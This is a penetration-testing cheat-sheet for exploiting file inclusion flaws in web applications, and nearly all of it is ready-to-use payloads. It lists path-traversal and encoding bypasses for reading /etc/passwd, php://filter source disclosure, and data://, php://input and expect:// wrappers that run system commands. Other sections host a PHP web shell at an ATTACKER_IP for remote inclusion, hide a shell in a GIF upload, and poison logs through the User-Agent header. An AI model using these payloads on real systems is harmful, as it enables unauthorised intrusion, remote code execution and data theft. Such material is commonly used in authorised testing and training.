# üî• File Inclusion (LFI / RFI) Exploitation Cheat-Sheet

---

> üìñ Intro

```c
File Inclusion vulnerabilities occur when user-controlled input is passed to file-handling functions (e.g., PHP include, NodeJS fs.readFile, Java import, .NET @Html.Partial).  
They allow attackers to read files, leak source code, or even achieve RCE  
We distinguish between:
- LFI (Local File Inclusion) ‚Üí Reading local files
- RFI (Remote File Inclusion) ‚Üí Including remote files/scripts
```


---

## üóÇÔ∏è Local File Inclusion (LFI)

>  Basic Payloads

```bash
# Linux passwd file
?page=/etc/passwd                                  (/etc/passwd)

# Windows boot.ini
?page=C:\Windows\boot.ini                          (Windows boot.ini)

# Path traversal
?page=../../../../etc/passwd                       (read passwd with traversal)
?page=....//....//....//etc/passwd                 (recursive bypass)

# Double encoding
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd               (../etc/passwd)
?page=..%252f..%252f..%252fetc%252fpasswd          (double encoded)
```

> Prefix / Extension Bypasses

```c
# Extension appended (e.g. .php auto added)
?page=/etc/passwd%00                              (null byte, old PHP)
?page=/etc/passwd/.                               (path truncation trick)
?page=/etc/passwd%23                              (# comment bypass in some cases)
```

> PHP Filters (Source Disclosure)
```c
# Base64 encode PHP source
?page=php://filter/read=convert.base64-encode/resource=index
(returns base64 of index.php)

# Decode on attacker side
echo 'BASE64_STRING' | base64 -d
```

> Wrappers for Code Execution

```c
# Data wrapper (if allow_url_include=On)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id
(executes system($_GET['cmd']))

# Input wrapper
curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
"http://target/index.php?page=php://input&cmd=id"

# Expect wrapper (if enabled)
?page=expect://id
```

## Remote File Inclusion - RFI

> HTTP Hosting

```c
# Attacker hosts shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000

# Victim includes it
?page=http://<ATTACKER_IP>:8000/shell.php&cmd=id
```

> FTP Hosting

```c
python -m pyftpdlib -p 21
?page=ftp://<IP>/shell.php&cmd=id
```

> SMB Hosting (Windows targets)

```c
impacket-smbserver share $(pwd)
?page=\\<IP>\share\shell.php&cmd=id
```

---
## üñºÔ∏è File Upload + LFI ‚Üí RCE


> üñºÔ∏è File Upload + LFI ‚Üí RCE

```c
# Malicious GIF upload
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
Upload ‚Üí /profile_images/shell.gif

# Include via LFI
?page=./profile_images/shell.gif&cmd=id
``` 

> üìú Log Poisoning

```c
# Poison User-Agent
curl -s http://target/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Include access.log
?page=/var/log/apache2/access.log&cmd=id
```

> üîé Automated Fuzzing

```c
# Discover params
ffuf -w wordlist.txt:FUZZ -u http://target/index.php?FUZZ=value

# LFI wordlist
ffuf -w LFI-Jhaddix.txt:FUZZ -u http://target/index.php?page=FUZZ
```





